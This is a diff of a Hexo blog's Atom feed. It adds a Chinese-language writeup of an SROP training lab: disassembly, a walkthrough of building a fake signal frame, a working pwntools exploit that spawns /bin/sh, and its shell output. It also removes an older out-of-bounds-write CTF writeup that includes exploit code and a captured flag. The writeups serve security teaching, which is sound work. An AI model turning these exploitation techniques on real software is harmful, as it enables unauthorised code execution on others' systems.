@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-08-05T18:14:31.836Z</updated>
+  <updated>2024-08-06T05:30:36.022Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LYS Rop lab_rop5 Writeup</title>
+    <link href="https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/"/>
+    <id>https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/</id>
+    <published>2024-08-05T15:57:48.463Z</published>
+    <updated>2024-08-06T05:30:36.022Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lab-srop"><a href="#lab-srop" class="headerlink" title="lab_srop"></a>lab_srop</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。</p><h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>首先這次的 lab 跟前面會有比較大的差異，必須要來先介紹一下 srop 是什麼東東。<br>那 srop 的全名是 Sigreturn Oriented Programming，這個攻擊手法來自於 kernel 在做信號處理的時候，會把之前的狀態保存在 user mode 可以讀寫的地址中，所以當我們去調整 signal frame 為特定值的時候，這時候呼叫 rt_sigreturn 的系統調用就會開 shell。那 signal frame 的結構如下（截圖自 lys 簡報）：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/srop_frame.png"                      alt="frame"                ></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>那這次的程式超級超級簡單，不用看少什麼 rop gadget 了，我們什麼都沒有 w，如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ objdump -M intel -d srop</span><br><span class="line"></span><br><span class="line">srop:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;.text&gt;:</span><br><span class="line">  401000:       48 31 c0                xor    rax,rax</span><br><span class="line">  401003:       ba 00 04 00 00          mov    edx,0x400</span><br><span class="line">  401008:       48 89 e6                mov    rsi,rsp</span><br><span class="line">  40100b:       48 89 c7                mov    rdi,rax</span><br><span class="line">  40100e:       0f 05                   syscall</span><br><span class="line">  401010:       c3                      ret</span><br></pre></td></tr></table></figure></div><p>這個程式跑起來會去執行 <code>read(0, rsp, 0x400)</code>，也就是從 stdin 讀 0x400 到 rsp 上。</p><h3 id="Find-RSP"><a href="#Find-RSP" class="headerlink" title="Find RSP"></a>Find RSP</h3><p>要算 rsp 最直接的方式就是直接跑起來進去 debug 看 stack 上的狀態然後找到適合的算一下差值就可以，需要注意的是有些差值是不固定的，所以可以多跑幾次確認，然後本地環境也需要盡量接近遠端，那這邊因為只是 lab 就偷懶只做本地了 XDD</p><h3 id="Build-Signal-Frame"><a href="#Build-Signal-Frame" class="headerlink" title="Build Signal Frame"></a>Build Signal Frame</h3><p>照 lys 的簡報乖乖填好：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/srop_execve.png"                      alt="execve"                ><br><code>&#39;/bin/sh\x00&#39;</code> 的位置可以透過直接 print(len(payload)) 來算出來</p><h3 id="Call-rt-sigreturn"><a href="#Call-rt-sigreturn" class="headerlink" title="Call rt_sigreturn"></a>Call rt_sigreturn</h3><p>要呼叫 r2_sigreturn 的話我們可以查詢 <a class="link"   href="https://x64.syscall.sh/" >syscall.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，會發現這次要把 rax 填成 15，也就是要跟剛開始的手法一樣，輸入 15 個 bytes 控 rax，但因為輸入的東西會從 rsp 開始，所以我們要覆蓋一樣的東西上去，才不會打亂我們剛剛構造的 signal frame，那 read 的時候因為已經吃掉 8 個 bytes 也就是 0x401000 所以我們會輸入 <code>p2[8:][:15]</code>，來確保 payload 不變，輸入後踩上 syscall 也就是 0x40100e 就會 call <code>r2_sigreturn</code> 搭配我們構造好的 signal frame 就會 call <code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">r = process(<span class="string">&quot;./srop&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;35.229.243.81&quot;, 10106)</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="number">0x401000</span>, <span class="number">0x401003</span>, <span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line">r.send(p)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.send(<span class="string">b&quot;\x03&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">0x2A0</span>)</span><br><span class="line">rsp = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x301</span></span><br><span class="line">r.recv(<span class="number">0x158</span>)</span><br><span class="line">success(<span class="string">&quot;rsp -&gt; %s&quot;</span> % <span class="built_in">hex</span>(rsp))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="number">0x401000</span>, <span class="number">0x40100E</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">14</span>,</span><br><span class="line">    rsp + <span class="number">272</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">5</span>,</span><br><span class="line">    <span class="number">0x3B</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x40100E</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">4</span>,</span><br><span class="line">    <span class="number">0x33</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># print(len(p2))</span></span><br><span class="line">p2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">r.send(p2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p2[<span class="number">8</span>:][:<span class="number">15</span>])</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./srop&#x27;</span>: pid 306520</span><br><span class="line">[+] rsp -&gt; 0x7ffd5dfea7a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(kazma) gid=1000(kazma) <span class="built_in">groups</span>=1000(kazma),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),101(netdev),116(bluetooth),129(scanner)</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lab-srop&quot;&gt;&lt;a href=&quot;#lab-srop&quot; class=&quot;headerlink&quot; title=&quot;lab_srop&quot;&gt;&lt;/a&gt;lab_srop&lt;/h1&gt;&lt;p&gt;這次藉著到 AIS3 當助教的緣故順便跟 &lt;a class=&quot;link&quot;   href=&quot;h</summary>
+      
+    
+    
+    
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
+    
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
+    
+    <category term="srop" scheme="https://kazma.tw/tags/srop/"/>
+    
+  </entry>
   
   <entry>
     <title>LYS Rop lab_rop4 Writeup</title>
@@ -34,9 +64,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -64,9 +94,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -96,9 +126,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -126,13 +156,13 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
+    
+    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
   </entry>
   
@@ -154,9 +184,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
@@ -184,9 +214,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -216,9 +246,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -294,9 +324,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -320,15 +350,15 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
     <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
+    
+    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
     
   </entry>
   
@@ -350,9 +380,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
@@ -404,15 +434,15 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
-    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
-    
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    
+    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
     
   </entry>
   
@@ -435,9 +465,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
@@ -461,9 +491,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -489,9 +519,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -517,9 +547,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -545,37 +575,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnctf oob2 Writeup</title>
-    <link href="https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/"/>
-    <id>https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/</id>
-    <published>2024-01-18T16:05:09.000Z</published>
-    <updated>2024-01-18T16:18:50.128Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="oob2"><a href="#oob2" class="headerlink" title="oob2"></a>oob2</h1><p>這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob2</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>那跟上一題基本上解法一樣，我們原本是 oob read admin 的 pincode 那現在變成是 oob write admin 的 pincode，exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;-4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p32(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;kazma&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob2&#x27;</span>: pid 14326</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging as [kazma] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;DJPD61GTBQIqqL7sWEvF&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;oob2&quot;&gt;&lt;a href=&quot;#oob2&quot; class=&quot;headerlink&quot; title=&quot;oob2&quot;&gt;&lt;/a&gt;oob2&lt;/h1&gt;&lt;p&gt;這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯</summary>
-      
-    
-    
-    
-    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
